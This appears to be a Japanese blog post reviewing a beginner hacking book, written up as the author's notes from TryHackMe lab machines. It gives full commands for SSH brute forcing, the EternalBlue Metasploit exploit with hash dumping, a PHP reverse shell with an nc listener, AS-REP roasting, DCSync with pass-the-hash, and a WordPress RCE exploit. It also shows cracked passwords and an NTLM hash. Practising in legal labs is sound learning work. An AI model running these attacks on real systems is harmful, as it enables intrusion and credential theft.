---
categories:
  - Tech
date: "2024-10-05T07:54:28+09:00"
page: false
slug: tryhackme-in-7days
title: "｢7 日間でハッキングをはじめる本｣を読んだ"
---

今回読んだ「7 日間でハッキングをはじめる本」では、TryHackMe という Web サイト を利用して、合法的に脆弱なサイトをハッキングし、攻撃者が使うツールを学ぶことができる。

以前、「体系的に学ぶ 安全な Web アプリケーションの作り方」を参考にし、業務で脆弱性の修正を行った経験はあったものの、攻撃者の視点に立ってハッキングを試みたことはなかった。この「7 日間でハッキングをはじめる本」を通じて、実際の攻撃に利用するツールを学ぶことができた。

この記事は、実際に手を動かしてハッキングを試した際のメモを元にしています。

<amazon id="B0D8N3YMF9" title="7 日間でハッキングをはじめる本" src="https://m.media-amazon.com/images/I/819xqHePE7L._SY466_.jpg">

## Day 1: ハッキングの準備をしよう

TryHaskMe のサイトから落としてきた ovpn ファイルを利用して VPN 接続を行う。

```bash
$ sudo openvpn ~/vpn/*.ovpn
```

VPN 接続後、サイト上の「OpenVPN Access Details」が有効にならなかった。これは、TryHackMe ウェブサイト側の問題の様子。その後、Day 2 で示されたターゲット IP アドレス 10.\*.\*.\* をブラウザで開ければ、接続に成功している。

## Day 2: はじめてのハッキング

nmap によるポートスキャンでマシンの偵察を行った。開いているポートの一覧が表示され、80 http、22 ssh、139, 445 Samba が開いていることを確認した。

```bash
$ nmap -sV -Pn -oN nmap.txt -v 10.*.*.*
```

ちなみに Samba は、Windows のファイルサーバやプリントサービス、ドメインコントローラ機能を提供するフリーソフトウェアのこと。

次に、ウェブサイトのディレクトリを辞書ファイルをもとに探索し、develop フォルダの存在が分かるが、攻略には繋がりそうになかった。

```bash
$ dirb http://10.*.*.*/ -o dirb_output.txt
```

続いて、Samba の共有フォルダに接続して手がかりを得る。

```bash
$ smbclient -L 10.*.*.*
$ smbclient \\\\10.*.*.*\\Anonymous
```

ユーザー jan が存在することが判明し、辞書攻撃を使ってパスワードを解析した。利用する rockyou.txt は過去にパスワードが流出したサービスのデータが元になっている。

```bash
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.*.*.* -t 4
```

取得したパスワードを利用してマシンの潜入に成功した。

```bash
$ ssh jan@10.*.*.*
```

## Day 3: 悪用厳禁のエクスプロイトを試してみよう

脆弱性を探すために以下の nmap コマンドを実行した。

```bash
$ nmap -sV -Pn -oN nmap.txt -v 10.*.*.* --script vuln

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

空いているポート 3389/tcp: Windows リモートデスクトッププロトコルが確認できたのと、それに関連した脆弱性が見つかった。Metasploit Framework を使って攻撃を行う。

```bash
$ msfconsole
$ msf6 > search CVE-2017-0143
$ msf6 > use 0
$ msf6 > show options
$ msf6 > set RHOSTS 10.*.*.* // ターゲット
$ msf6 > set LHOSTS 10.*.*.* // ローカル
$ msf6 > exploit
```

接続が不安定だったため、データサイズを調整した。

```bash
$ sudo ip link set dev tun0 mtu 1200
```

接続後、システム情報とハッシュダンプの取得を行った。

```bash
$ meterpreter > getuid
$ meterpreter > sysinfo
$ meterpreter > hashdump
```

取得したハッシュを [CrackStation](https://crackstation.net/) で確認し、ハッシュの元になったパスワードが判明する。これにより、リモートデスクトップで侵入できる。

```bash
$ xfreerdp /u:Jon /v:10.*.*.* /p:alqfna22 /cert:ignore /sec:rdp
```

## Day 4: よくある脆弱性を使って怪しいショップで遊ぼう

Admin のパスワードを特定するために、辞書攻撃を行う。今回は rockyou.txt ではなく [SecLists](https://github.com/danielmiessler/SecLists) を使用した。

```bash
$ sudo apt install seclists
$ tree /usr/share/seclists | less
```

Burp Suite の Intruder 機能を使って辞書攻撃を実行した。401 を返していた API /rest/user/login を探し、そのリクエスト内の password を変数にして、API リクエストを繰り返し、パスワードの特定を行った。

## Day 5: Web フォームから侵入しよう

nmap によるポートスキャンでマシンの偵察を行った。

```bash
$ nmap -sV -Pn -oN nmap.txt -v 10.*.*.*
```

次に、FTP サーバーに接続を試みたが、anonymouns, パスワードなしでは侵入できなかった。

```bash
$ ftp 10.*.*.*
```

続いて、dirb を使ってファイルアップロードサイトの存在を確認した。

```bash
$ dirb http://10.*.*.*:3333 /usr/share/dirb/wordlists/small.txt
```

特定の拡張子だけアップロードできることが推定されるため、Burp Suite の Intruder を使って、拡張子を変数としてリクエストを繰り返し、phtml 形式が許可されていることが判明した。そこで、リバースシェルを利用して SSH アクセスを試みる。

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php .
$ mv php-reverse-shell.php php-reverse-shell.phtml
$ vim php-reverse-shell.phtml // 自分の IP アドレスとポート番号を指定
$ nc -lvnp 12345
```

nc コマンドで接続を待っている間に、ブラウザから phtml ファイルにアクセスすると、ターミナルで SSH が使用可能となった。

次に、SUID を利用した権限昇格を試みた。通常の実行ファイルは、実行者の権限で実行されるが、SUID が設定されている場合、所有者の権限で動作する。まずは以下のコマンドで SUID が設定されたファイルを捜索した。

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

`systemctl` が容疑者候補に上がり、[GTFOBins](https://gtfobins.github.io/) から systemctl を利用した権限昇格方法を検索し、`$ cat /root/root.txt` を走らせた。

## Day 6: Active Directory のハッキング実践

nmap によるポートスキャンを実施し、88 Kerberos, 139 SMB が稼働していることを確認した。

```bash
$ nmap -p 88,135,139,3389 -A -Pn -oN nmap.txt -v 10.*.*.*
```

次に、AS-REP Roasting 攻撃のために [Kerbrute](https://github.com/ropnop/kerbrute) を使ってユーザーを列挙した。

```bash
$ sudo vim /etc/hosts // spookysec.local 追加
$ ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt
```

ユーザー名を変数に GetNPUsers.py を使って TGT を取得し、hashcat でパスワード解析を試みた。

```bash
$ ./GetNPUsers.py spookysec.local/svc-admin
$ hashcat -m 18200 hash.txt passwordlist.txt
```

この際、次のエラーが表示されたため、Vertual Box のメモリを 2024 → 4048MB に増やした。

```
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8700B CPU @ 3.20GHz, 708/1480 MB (256 MB allocatable), 2MCU
```

次に、SMB クライアントを使ってバックアップファイルを取得し、その内容を Base64 デコードした。

```bash
$ smbclient -L \\\\spookysec.local -U svc-admin
$ smbclient \\\\spookysec.local\\backup -U svc-admin
$ cat backup_credentials.txt | base64 -d
```

最後に、DCSync 攻撃を行い、Pass the Hash 攻撃を使って管理者権限でログインした。

```bash
$ cp /usr/share/doc/python3-impacket/examples/secretsdump.py .
$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

## Day 7: WordPress のハッキング実践

nmap によるポートスキャンでマシンの偵察を行った。

```bash
$ sudo vim /etc/hosts // blog.thm 追加
$ nmap -A -Pn -oN nmap.txt -v blog.thm
```

次に、wpscan を使ってユーザー名を取得し、パスワードを辞書攻撃で解析した。

```bash
$ wpscan --url http://blog.thm --enumerate u
$ wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 4
```

WordPress 5.0 の脆弱性を利用して攻撃を仕掛け、管理者権限を取得した。

```bash
$ msfconsole
msf6 > search CVE-2019-8942
msf6 > use 0
msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set rhosts blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
msf6 exploit(multi/http/wp_crop_rce) > set lhost 10.17.15.81
msf6 exploit(multi/http/wp_crop_rce) > exploit
```

次に、Linpeas を使ってシステムの脆弱性をチェックを行う。linpeas.sh をターゲットマシンに送り込むために、手元のマシンでサーバーを立ち上げる。

```bash
$ sudo apt-get update
$ sudo apt install peass
$ cp /usr/share/peass/linpeas/linpeas.sh .
$ python3 -m http.server 12345
```

これをターゲットマシンから取得する。何度か、`Exception occurred during processing of request from ...` というエラーが吐かれたがトライして成功した。

```bash
$ wget 10.17.15.81:12345/linpeas.sh
```

ダウンロード後、スクリプトに実行権限を付与し、実行した結果、脆弱なバイナリファイルが発見できる。

```bash
$ chmod +x linpeas.sh
$ ./linpeas.sh | tee linpeas_output.txt
```

SUID 権限が設定されたファイルを利用して、権限昇格を成功させた。
